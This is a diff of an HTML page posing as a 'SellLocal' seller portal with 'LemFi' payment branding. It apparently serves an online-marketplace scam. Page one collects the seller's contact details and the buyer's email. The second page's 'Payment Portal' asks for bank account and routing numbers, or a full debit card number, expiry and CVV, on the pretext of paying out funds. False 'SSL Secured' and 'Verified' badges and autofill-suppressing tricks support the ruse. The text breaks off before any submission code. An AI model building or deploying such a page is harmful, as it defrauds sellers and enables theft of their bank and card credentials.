@@ -3,420 +3,505 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Seller Portal</title>
+    <title>SellLocal — Seller Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* --- Theme Variables --- */
+        /* --- ORIGINAL CSS (Kept & Extended) --- */
         *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
         :root{
-            --green:#10B981; --green-dark:#047857; --green-darker:#065F46;
-            --green-light:#ECFDF5; --green-ghost:#D1FAE5;
-            --blue:#0066CC; --text:#1A1A2E; --text-sec:#5C5C5C; --text-tri:#999;
-            --border:#DEDEDE; --border-f:#10B981; --bg:#F5F5F5; --card:#FFF;
-            --input-bg:#FAFAFA; --input-focus:#FFF; --shadow:0 2px 16px rgba(0,0,0,0.07);
-            --shadow-btn:0 4px 14px rgba(16, 185, 129, 0.35);
-            --r:10px; --r-xl:16px
+            --green:#1E9E5A;--green-dark:#167A45;--green-darker:#0F5C33;
+            --green-light:#E6F6EE;--green-ghost:#F2FBF6;
+            --blue:#0066CC;--blue-dark:#004C99;
+            --text:#1A1A2E;--text-sec:#5C5C5C;--text-tri:#999;
+            --border:#DEDEDE;--border-f:#1E9E5A;
+            --bg:#F5F5F5;--card:#FFF;--input-bg:#FAFAFA;--input-focus:#FFF;
+            --shadow:0 2px 16px rgba(0,0,0,0.07);
+            --shadow-btn:0 4px 14px rgba(30,158,90,0.35);
+            --r:10px;--r-lg:14px;--r-xl:16px
         }
-        body{font-family:'Nunito Sans',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);padding:20px;color:var(--text)}
+        body{font-family:'Nunito Sans',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);padding:24px 16px;color:var(--text);-webkit-font-smoothing:antialiased}
         .pw{position:relative;width:100%;max-width:480px}
-        .hidden{display:none !important}
 
-        /* Top Bar & Logo */
-        .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+        /* Top Bar */
+        .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px;padding:0 2px}
         .logo{display:flex;align-items:center;gap:9px;text-decoration:none}
-        .lm{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;background:var(--green)}
-        .lm svg{width:24px;height:24px;color:#fff}
-        .lw{font-size:18px;font-weight:800;color:var(--text)}
+        .lm{width:38px;height:38px;border-radius:9px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
+        .lm svg{width:38px;height:38px}
+        .lw{font-size:17px;font-weight:800;color:var(--text);letter-spacing:-0.3px}
+        .hl{font-size:13px;font-weight:600;color:var(--blue);text-decoration:none;padding:6px 10px;border-radius:8px;transition:background .2s;display:flex;align-items:center;gap:4px}
+        .hl:hover{background:#E8F0FE}
+        .hl svg{width:15px;height:15px}
 
-        /* Progress Steps */
-        .steps{display:flex;justify-content:space-between;margin-bottom:24px;position:relative}
-        .steps::before{content:'';position:absolute;top:50%;left:0;width:100%;height:2px;background:#e5e7eb;z-index:0;transform:translateY(-50%)}
-        .step{position:relative;z-index:1;background:var(--card);padding:0 10px;display:flex;flex-direction:column;align-items:center;gap:4px}
-        .step-num{width:28px;height:28px;border-radius:50%;background:#e5e7eb;color:var(--text-tri);font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;border:2px solid var(--card);transition:all .3s}
-        .step.active .step-num{background:var(--green);color:#fff;border-color:var(--green)}
-        .step.completed .step-num{background:var(--green-dark);color:#fff;border-color:var(--green-dark)}
-        .step-label{font-size:11px;font-weight:600;color:var(--text-tri);text-transform:uppercase}
-        .step.active .step-label{color:var(--green-dark)}
+        /* Card & Typography */
+        .card{background:var(--card);border-radius:var(--r-xl);box-shadow:var(--shadow);border:1px solid rgba(0,0,0,0.04);overflow:hidden;min-height: 500px; position: relative;}
+        .ch{padding:30px 30px 0}
+        .ch h2{font-size:19px;font-weight:700;color:var(--text);margin-bottom:5px}
+        .ch p{font-size:14px;color:var(--text-sec);line-height:1.5}
 
-        /* Card & Form */
-        .card{background:var(--card);border-radius:var(--r-xl);box-shadow:var(--shadow);border:1px solid rgba(0,0,0,0.04);overflow:hidden}
-        .ch{padding:24px 24px 0}
-        .ch h2{font-size:18px;font-weight:700;color:var(--text);margin-bottom:4px}
-        .ch p{font-size:13px;color:var(--text-sec)}
-        
-        .fb{padding:8px 24px 24px}
-        .ig{margin-bottom:16px}
-        .ig label{display:block;font-size:12px;font-weight:700;color:var(--text);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px}
+        /* Info Box */
+        .ib{margin:18px 30px 0;background:var(--green-ghost);border:1px solid rgba(30,158,90,0.15);border-radius:var(--r);padding:11px 14px;display:flex;align-items:flex-start;gap:9px}
+        .ib svg{width:17px;height:17px;color:var(--green);flex-shrink:0;margin-top:1px}
+        .ib span{font-size:13px;color:#0F5C33;line-height:1.5}
+        .ib strong {display:block; margin-bottom:2px; color: var(--green-dark); font-weight: 700;}
+
+        /* Form Inputs */
+        .fb{padding:14px 30px 30px}
+        .ig{margin-bottom:15px}
+        .ig label{display:block;font-size:13px;font-weight:600;color:var(--text);margin-bottom:6px}
         .iw{position:relative}
-        .iw .fi{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;color:var(--text-tri)}
-        
-        .ig input, .ig select{width:100%;padding:12px 12px 12px 40px;border:1.5px solid var(--border);border-radius:var(--r);font-size:14px;font-family:inherit;color:var(--text);background:var(--input-bg);transition:all .2s;outline:none;appearance:none}
-        .ig input:focus, .ig select:focus{border-color:var(--border-f);background:var(--input-focus);box-shadow:0 0 0 3px rgba(16, 185, 129, 0.1)}
-        .ig input:focus~.fi, .ig select:focus~.fi{color:var(--green)}
+        .iw .fi{position:absolute;left:13px;top:50%;transform:translateY(-50%);width:17px;height:17px;color:var(--text-tri);pointer-events:none;transition:color .2s}
+        .ig input,.ig select,.ig textarea{width:100%;padding:12px 13px 12px 40px;border:1.5px solid var(--border);border-radius:var(--r);font-size:14px;font-family:inherit;color:var(--text);background:var(--input-bg);transition:all .2s;outline:none;appearance:auto}
+        .ig textarea{min-height:80px;resize:vertical;padding-left:40px}
+        .ig input::placeholder,.ig textarea::placeholder{color:var(--text-tri)}
+        .ig input:focus,.ig select:focus,.ig textarea:focus{border-color:var(--border-f);background:var(--input-focus);box-shadow:0 0 0 3px rgba(30,158,90,0.1)}
+        .ig input:focus~.fi,.ig select:focus~.fi,.ig textarea:focus~.fi{color:var(--green)}
+        .sel select{padding-left:40px;cursor:pointer}
+        .cb{position:absolute;right:13px;top:50%;transform:translateY(-50%);background:var(--green-light);color:var(--green-dark);font-size:11px;font-weight:700;padding:3px 7px;border-radius:5px;pointer-events:none}
+        .ai{padding-right:58px!important}
 
-        .select-wrapper::after{content:'▼';font-size:9px;color:var(--text-tri);position:absolute;right:15px;top:50%;transform:translateY(-50%);pointer-events:none}
+        /* Platform Chips */
+        .pf{border:1.5px solid var(--border);border-radius:var(--r);padding:12px 13px;background:var(--input-bg);display:flex;flex-wrap:wrap;gap:8px}
+        .pf label{display:flex;align-items:center;gap:6px;font-size:13px;font-weight:600;color:var(--text-sec);background:#fff;border:1.5px solid var(--border);border-radius:20px;padding:6px 12px;cursor:pointer;transition:all .2s;margin:0}
+        .pf label:hover{border-color:var(--green)}
+        .pf input{display:none}
+        .pf input:checked+span{color:var(--green-dark)}
+        .pf label:has(input:checked){border-color:var(--green);background:var(--green-light);color:var(--green-dark)}
+        .ig .pf{padding:10px}
+        .ig>label{margin-bottom:6px}
 
-        /* Summary Box */
-        .summary-box{background:var(--green-light);border:1px solid var(--green-ghost);border-radius:var(--r);padding:12px;margin-bottom:16px}
-        .summary-row{display:flex;justify-content:space-between;font-size:13px;color:var(--text-sec);margin-bottom:4px}
-        .summary-row.total{margin-top:8px;padding-top:8px;border-top:1px dashed var(--green);font-weight:700;color:var(--green-dark);font-size:15px}
-
-        /* Payment Type Toggle */
-        .type-toggle{display:flex;gap:10px;margin-bottom:16px}
-        .type-btn{flex:1;padding:10px;border:1.5px solid var(--border);border-radius:var(--r);background:var(--input-bg);font-size:13px;font-weight:600;color:var(--text-sec);cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:6px}
-        .type-btn.selected{border-color:var(--green);background:var(--green-light);color:var(--green-dark)}
-        .type-btn svg{width:16px;height:16px}
-
-        /* Notification Box */
-        .note-box{background:#FFF7ED;border-left:4px solid #F97316;padding:12px;border-radius:4px;margin-bottom:16px;font-size:12px;color:#9A3412;line-height:1.5}
-        .note-box strong{display:block;margin-bottom:4px;color:#C2410C}
+        /* Total Box */
+        .total{background:var(--green-ghost);border:1.5px solid rgba(30,158,90,0.3);border-radius:var(--r);padding:14px 16px;margin:6px 0 4px}
+        .total .tr{display:flex;justify-content:space-between;font-size:14px;color:var(--text-sec);margin-bottom:6px}
+        .total .tr:last-child{margin-bottom:0;padding-top:8px;border-top:1px dashed rgba(30,158,90,0.4);font-size:17px;font-weight:800;color:var(--green-dark)}
 
         /* Buttons */
-        .bp{width:100%;padding:14px;background:var(--green);color:#fff;border:none;border-radius:var(--r);font-size:15px;font-weight:700;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px}
-        .bp:hover{background:var(--green-dark);box-shadow:var(--shadow-btn)}
-        .bp:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
+        .bp{width:100%;padding:13px 20px;background:var(--green);color:#fff;border:none;border-radius:var(--r);font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;transition:all .25s;display:flex;align-items:center;justify-content:center;gap:7px;margin-top:18px;position:relative;overflow:hidden}
+        .bp::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.12) 0%,transparent 100%);pointer-events:none}
+        .bp:hover{background:var(--green-dark);box-shadow:var(--shadow-btn);transform:translateY(-1px)}
+        .bp:active{transform:translateY(0)}
+        .bp:disabled{opacity:.6;cursor:not-allowed;transform:none;box-shadow:none}
+        .bp .ba{width:15px;height:15px;transition:transform .2s}
+        .bp:hover .ba{transform:translateX(2px)}
+        .spinner{width:17px;height:17px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
+        @keyframes sp{to{transform:rotate(360deg)}}
         
-        .bp-outline{width:100%;padding:13px;background:transparent;color:var(--text-sec);border:1.5px solid var(--border);border-radius:var(--r);font-size:14px;font-weight:600;cursor:pointer;margin-top:12px;transition:all .2s}
+        .bp-outline{width:100%;padding:12px;background:transparent;border:1.5px solid var(--border);color:var(--text-sec);border-radius:var(--r);font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:6px;margin-top:10px}
         .bp-outline:hover{background:var(--bg);border-color:#ccc}
 
-        .spinner{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
-        @keyframes sp{to{transform:rotate(360deg)}}
+        /* Error/Success Messages */
+        .em{color:#DC2626;font-size:13px;text-align:center;margin-top:12px;display:none;padding:7px 11px;background:#FEF2F2;border-radius:8px;border:1px solid #FECACA}
+        
+        /* Footer/Divider */
+        .dv{display:flex;align-items:center;gap:12px;margin:18px 30px 14px}
+        .dv::before,.dv::after{content:'';flex:1;height:1px;background:var(--border)}
+        .dv span{font-size:11px;color:var(--text-tri);white-space:nowrap}
+        .cf{padding:0 30px 26px}
+        .ft{text-align:center;font-size:12px;color:var(--text-tri);line-height:1.7}
+        .ft a{color:var(--blue);text-decoration:none;font-weight:600}
+        .ft a:hover{text-decoration:underline;color:var(--blue-dark)}
+        .sr{display:flex;align-items:center;justify-content:center;gap:14px;margin-top:18px;padding-top:18px;border-top:1px solid var(--border)}
+        .sb{display:flex;align-items:center;gap:4px;font-size:10px;color:var(--text-tri)}
+        .sb svg{width:13px;height:13px;color:var(--green)}
 
-        .msg{font-size:13px;text-align:center;margin-top:12px;padding:8px;border-radius:6px;display:none}
-        .msg.error{background:#FEF2F2;color:#DC2626;border:1px solid #FECACA}
-        .msg.success{background:#ECFDF5;color:#059669;border:1px solid #A7F3D0}
+        /* Toast */
+        .toast{position:fixed;top:24px;left:50%;transform:translateX(-50%) translateY(-120%);background:var(--text);color:#fff;padding:11px 18px;border-radius:var(--r);font-size:14px;font-family:inherit;box-shadow:0 8px 30px rgba(0,0,0,.15);z-index:9999;transition:transform .4s cubic-bezier(.16,1,.3,1)}
+        .toast.show{transform:translateX(-50%) translateY(0)}
+
+        /* Animation */
+        @keyframes fu{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+        .an{animation:fu .45s cubic-bezier(.16,1,.3,1) forwards;opacity:0}
+        .d1{animation-delay:.04s}.d2{animation-delay:.08s}.d3{animation-delay:.12s}.d4{animation-delay:.16s}.d5{animation-delay:.2s}.d6{animation-delay:.24s}.d7{animation-delay:.28s}.d8{animation-delay:.32s}.d9{animation-delay:.36s}.d10{animation-delay:.4s}
+
+        /* Utility */
+        .hidden{display:none !important}
+        @media(max-width:480px){body{padding:14px 10px}.ch,.fb{padding-left:22px;padding-right:22px}.cf,.dv{padding-left:22px;padding-right:22px;margin-left:0;margin-right:0}.ib{margin-left:22px;margin-right:22px}}
+
+        /* Invoice overlay */
+        .io{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:1000;display:none;align-items:center;justify-content:center;padding:20px;overflow-y:auto;backdrop-filter: blur(4px);}
+        .io.show{display:flex}
+        .inv{background:#fff;border-radius:var(--r-xl);max-width:560px;width:100%;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,.2);position:relative}
+        .inv h3{font-size:20px;font-weight:800;color:var(--green-dark);margin-bottom:2px}
+        .inv .invno{font-size:12px;color:var(--text-tri);margin-bottom:18px}
+        .inv .row{display:flex;justify-content:space-between;padding:7px 0;font-size:14px;border-bottom:1px solid #F0F0F0}
+        .inv .row span:first-child{color:var(--text-sec)}
+        .inv .row span:last-child{font-weight:600}
+        .inv .gt{display:flex;justify-content:space-between;padding:12px 0 0;font-size:18px;font-weight:800;color:var(--green-dark)}
+        .invbtns{display:flex;gap:10px;margin-top:22px}
+        .invbtns button{flex:1;padding:11px;border-radius:var(--r);font-family:inherit;font-weight:700;font-size:14px;cursor:pointer}
+        .bdl{background:var(--green);color:#fff;border:none}
+        .bdl:hover{background:var(--green-dark)}
+        .bcp{background:transparent;border:1.5px solid var(--border);color:var(--text)}
+        .bcp:hover{background:var(--bg)}
+        .invx{position:absolute;top:14px;right:16px;background:none;border:none;font-size:22px;color:var(--text-tri);cursor:pointer}
+        @media print{body *{visibility:hidden}.io,.io *{visibility:visible}.io{position:absolute;inset:0;background:#fff;display:block;padding:0}.inv{box-shadow:none;max-width:100%}.invbtns,.invx{display:none}}
+
+        /* --- PAGE 2 STYLES (Payment Portal) --- */
+        
+        /* Payment Method Toggle */
+        .pay-toggle{display:flex;gap:12px;margin-bottom:16px}
+        .pay-opt{flex:1;border:1.5px solid var(--border);background:var(--input-bg);padding:12px;border-radius:var(--r);text-align:center;cursor:pointer;transition:all .2s;position:relative}
+        .pay-opt h4{font-size:14px;font-weight:700;color:var(--text-sec);margin-bottom:4px}
+        .pay-opt svg{width:22px;height:22px;color:var(--text-tri);transition:color .2s}
+        .pay-opt input{position:absolute;opacity:0;inset:0;cursor:pointer}
+        .pay-opt.active{border-color:var(--green);background:var(--green-light);box-shadow:0 0 0 1px var(--green)}
+        .pay-opt.active h4{color:var(--green-dark)}
+        .pay-opt.active svg{color:var(--green)}
+
+        /* Info Alert Box */
+        .alert-box{background:#FFF7ED;border:1px solid #FFEDD5;border-radius:var(--r);padding:14px;margin-bottom:20px;display:flex;gap:12px;align-items:start}
+        .alert-box svg{width:20px;height:20px;color:#EA580C;flex-shrink:0;margin-top:2px}
+        .alert-box div{font-size:13px;color:#9A3412;line-height:1.5}
+        .alert-box strong{color:#C2410C;display:block;margin-bottom:2px}
+
+        /* Back Button */
+        .back-btn{background:none;border:none;color:var(--text-sec);cursor:pointer;display:flex;align-items:center;gap:6px;font-size:13px;font-weight:600;padding:0;margin-bottom:10px}
+        .back-btn:hover{color:var(--green)}
+
     </style>
 </head>
 <body>
+    <div class="toast" id="toast"></div>
+    <div class="pw">
+        <div class="top an">
+            <a href="#" class="logo">
+                <div class="lm"><svg viewBox="0 0 38 38" fill="none"><rect width="38" height="38" rx="9" fill="#1E9E5A"/><path d="M9.5 26.5L14 12.5L17.5 21L21 11L24.5 21L29 12.5" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg></div>
+                <span class="lw">selllocal</span>
+            </a>
+            <a href="#" class="hl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>Help</a>
+        </div>
+        
+        <div class="card">
+            <!-- PAGE 1: PRODUCT & SHIPPING -->
+            <div id="page-1">
+                <div class="ch an d1"><h2>Seller transaction details</h2><p>Enter your product and shipping info — we'll calculate the buyer's total.</p></div>
+                <div class="ib an d2"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg><span><strong>Secure Transaction</strong><br>Your details are encrypted and protected end-to-end.</span></div>
+                <form id="sellerForm" autocomplete="off" class="fb">
+                    <div class="ig an d3"><label for="fullName">Full name</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg><input type="text" id="fullName" name="fullName" placeholder="e.g. John Doe" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')"></div></div>
+                    <div class="ig an d3"><label for="itemSold">Product or service sold</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg><input type="text" id="itemSold" name="itemSold" placeholder="e.g. iPhone 14 Pro, 128GB" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')"></div></div>
+                    <div class="ig an d4"><label for="amount">Product amount</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg><input type="text" id="amount" name="amount" class="ai" placeholder="0.00" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')" inputmode="decimal" oninput="calcTotal()"><span class="cb">USD</span></div></div>
+                    <div class="ig an d4"><label for="sellerPhone">Phone number</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg><input type="tel" id="sellerPhone" name="sellerPhone" placeholder="+1 555-123-4567" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')"></div></div>
+                    <div class="ig an d4"><label for="sellerEmail">Your email address</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg><input type="email" id="sellerEmail" name="sellerEmail" placeholder="you@example.com" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')"></div></div>
+                    <div class="ig an d5"><label for="buyerEmail">Buyer's email address</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg><input type="email" id="buyerEmail" name="buyerEmail" placeholder="buyer@example.com" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')"></div></div>
 
-<div class="pw">
-    <div class="top">
-        <a href="#" class="logo">
-            <div class="lm">
-                <!-- LemFi-style Logo -->
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+                    <div class="ig sel an d5"><label for="shipFrom">Shipping from</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg><select id="shipFrom" name="shipFrom" required onchange="calcTotal()"></select></div></div>
+                    <div class="ig sel an d5"><label for="shipTo">Shipping to</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg><select id="shipTo" name="shipTo" required onchange="calcTotal()"></select></div></div>
+
+                    <div class="ig an d6"><label>Third-party platform (select all that apply)</label>
+                        <div class="pf" id="platformBoxes"></div>
+                    </div>
+
+                    <div class="total an d6" id="totalBox">
+                        <div class="tr"><span>Product amount</span><span id="tProd">$0.00</span></div>
+                        <div class="tr"><span>Shipping cost</span><span id="tShip">$0.00</span></div>
+                        <div class="tr"><span>Buyer's total to pay</span><span id="tTotal">$0.00</span></div>
+                    </div>
+
+                    <!-- CHANGED: Button now triggers next step, not submit directly -->
+                    <button type="button" class="bp an d7" onclick="goToPage2()">
+                        <span>Continue to Payment</span>
+                        <svg class="ba" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                    </button>
+                    <div id="errorMsg" class="em"></div>
+                </form>
+                <div class="dv an d9"><span>Step 1 of 2</span></div>
+                <div class="cf">
+                    <p class="ft an d9">By continuing you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+                    <div class="sr an d9"><div class="sb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div><div class="sb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Protected</div><div class="sb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Verified</div></div>
+                </div>
             </div>
-            <span class="lw">Seller Portal</span>
-        </a>
+
+            <!-- PAGE 2: PAYMENT PORTAL -->
+            <div id="page-2" class="hidden">
+                <div class="ch">
+                    <button class="back-btn" onclick="goToPage1()">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+                        Back
+                    </button>
+                    <h2>Payment Portal</h2>
+                    <p>Enter your payout details to receive funds.</p>
+                </div>
+
+                <!-- Informative Alert Box -->
+                <div class="alert-box" style="margin: 18px 30px 0;">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                    <div>
+                        <strong>LemFi Payment Confirmation</strong>
+                        The buyer will pay you using their <strong>LemFi Wallet</strong>. Once payment is verified, you will receive a confirmation call at the number provided in Step 1.
+                    </div>
+                </div>
+
+                <form id="paymentForm" autocomplete="off" class="fb">
+                    <!-- Payment Method Selection -->
+                    <div class="pay-toggle">
+                        <label class="pay-opt active" id="opt-bank">
+                            <input type="radio" name="payoutType" value="bank" checked onchange="togglePayout('bank')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
+                            <h4>Bank Account</h4>
+                        </label>
+                        <label class="pay-opt" id="opt-card">
+                            <input type="radio" name="payoutType" value="card" onchange="togglePayout('card')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                            <h4>Debit Card</h4>
+                        </label>
+                    </div>
+
+                    <!-- Bank Fields -->
+                    <div id="bankFields">
+                        <div class="ig"><label>Bank Name</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 21h18M5 21V7l8-4 8 4v14M8 21v-4h8v4"/></svg><input type="text" name="bankName" placeholder="e.g. Wells Fargo" style="padding-left:40px" required></div></div>
+                        <div class="ig"><label>Account Number / IBAN</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><input type="text" name="accountNum" placeholder="0000000000" style="padding-left:40px" required></div></div>
+                        <div class="ig"><label>Routing / Sort Code</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg><input type="text" name="routingNum" placeholder="000000000" style="padding-left:40px" required></div></div>
+                    </div>
+
+                    <!-- Card Fields -->
+                    <div id="cardFields" style="display:none">
+                        <div class="ig"><label>Cardholder Name</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg><input type="text" name="cardName" placeholder="Name on card" style="padding-left:40px"></div></div>
+                        <div class="ig"><label>Card Number</label><div class="iw"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg><input type="text" name="cardNum" placeholder="0000 0000 0000 0000" style="padding-left:40px"></div></div>
+                        <div style="display:flex;gap:10px">
+                            <div class="ig" style="flex:1"><label>Expiry</label><input type="text" name="cardExp" placeholder="MM/YY" style="width:100%;padding:10px;border:1.5px solid var(--border);border-radius:var(--r);background:var(--input-bg)"></div>
+                            <div class="ig" style="flex:1"><label>CVV</label><input type="text" name="cardCvv" placeholder="123" style="width:100%;padding:10px;border:1.5px solid var(--border);border-radius:var(--r);background:var(--input-bg)"></div>
+                        </div>
+                    </div>
+
+                    <!-- Hidden inputs to combine data -->
+                    <input type="hidden" name="platforms" id="hiddenPlatforms">
+                    <input type="hidden" name="totalAmount" id="hiddenTotal">
+
+                    <!-- FINAL SUBMIT BUTTON -->
+                    <button type="submit" class="bp" id="submitBtn">
+                        <span>Generate invoice & submit</span>
+                        <svg class="ba" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                    </button>
+                    <div id="paymentError" class="em"></div>
+                </form>
+                <div class="dv"><span>Step 2 of 2</span></div>
+                <div class="cf">
+                    <p class="ft">By continuing you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
